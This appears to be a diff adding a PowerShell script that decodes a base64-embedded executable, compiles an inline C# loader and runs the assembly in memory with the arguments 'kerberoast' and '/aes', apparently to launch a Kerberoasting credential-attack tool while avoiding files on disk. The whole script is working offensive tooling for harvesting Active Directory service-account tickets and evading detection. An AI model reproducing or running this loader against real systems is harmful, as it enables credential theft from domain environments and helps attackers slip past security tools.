@@ -1,0 +1,34 @@
+$exeBytes = [Convert]::FromBase64String($base64String)
+
+
+$arguments = @("kerberoast", "/aes")
+
+# C# code to load the assembly from bytes and invoke the Main method with arguments
+$assemblyLoader = @"
+using System;
+using System.Reflection;
+
+public class Loader {
+    public static void LoadAndRun(byte[] exeBytes, string[] args) {
+        Assembly assembly = Assembly.Load(exeBytes);
+
+        MethodInfo entryPoint = assembly.EntryPoint;
+
+        if (entryPoint != null) {
+            // Check if Main has parameters or not and invoke appropriately
+            if (entryPoint.GetParameters().Length == 0) {
+                entryPoint.Invoke(null, null);
+            } else {
+                entryPoint.Invoke(null, new object[] { args });
+            }
+        } else {
+            Console.WriteLine("No entry point found.");
+        }
+    }
+}
+"@  
+
+Add-Type -TypeDefinition $assemblyLoader -Language CSharp
+
+# Call the LoadAndRun method to load the assembly and invoke the Main method with arguments
+[Loader]::LoadAndRun($exeBytes, $arguments)
